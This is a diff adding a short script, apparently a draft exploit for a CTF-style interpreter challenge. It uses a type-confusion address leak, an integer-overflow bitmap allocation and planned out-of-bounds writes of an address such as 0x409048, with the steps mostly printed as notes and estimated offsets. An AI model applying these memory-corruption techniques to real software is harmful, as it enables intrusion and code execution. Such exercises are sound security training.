@@ -1,0 +1,36 @@
+print("=== Step 4: Actual Implementation ===");
+
+print("Step 1: Leak addresses");
+int leak1 = 0;
+string leak1 = "first";
+int addr1 = leak1;
+print(addr1);
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target address:");
+print(targetaddr);
+
+print("Step 2: Create bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 3: Estimate variable entry address");
+print("Variable entry is typically 0x200-0x400 bytes before string");
+print("entry_addr ≈ targetaddr - 0x300");
+print("value_ptr = entry_addr + 0x28");
+
+print("Step 4: Estimate bitmap buffer address");
+print("bitmap_data_ptr ≈ targetaddr + 0x1000");
+
+print("Step 5: Calculate coordinates");
+print("For now, we'll try y=0 and small x values");
+print("to test if we can reach the variable entry");
+
+print("Step 6: Write test value first");
+print("We'll write a test pattern to verify we hit the right address");
+print("Then write 0x409048");
+
+print("Note: This requires exact address calculation");
+print("which needs OOB read to find entry_addr and bitmap_data_ptr");
+
